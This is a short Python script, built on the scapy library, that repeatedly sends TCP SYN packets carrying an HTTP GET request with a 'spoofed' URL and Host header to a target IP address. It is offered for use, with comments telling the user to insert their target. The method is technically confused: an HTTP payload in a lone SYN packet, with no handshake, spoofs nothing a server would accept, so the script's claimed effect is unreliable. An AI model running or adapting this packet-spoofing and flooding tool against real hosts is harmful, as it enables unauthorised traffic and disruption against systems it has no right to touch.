from scapy.all import *

def spoof_url(target_ip, target_port, spoofed_url, spoofed_host, num_packets, delay):
    ethernet = Ether()
    ip = IP(dst=target_ip)
    tcp = TCP(dport=target_port, flags="S")
    http = "GET {0} HTTP/1.1\r\nHost: {1}\r\n\r\n".format(spoofed_url, spoofed_host)
    packet = ethernet / ip / tcp / Raw(load=http)
    
    for _ in range(num_packets):
        sendp(packet, verbose=False)
        time.sleep(delay)

target_ip = "192.168.0.100"  # Replace with the IP address of your target
target_port = 80  # Replace with the target port (e.g., 80 for HTTP)
spoofed_url = "http://spoofedurl.com"  # Replace with the URL you want to spoof
spoofed_host = "spoofedhost.com"  # Replace with the spoofed hostname
num_packets = 100  # Number of packets to send
delay = 0.1  # Delay between each packet (in seconds)

spoof_url(target_ip, target_port, spoofed_url, spoofed_host, num_packets, delay)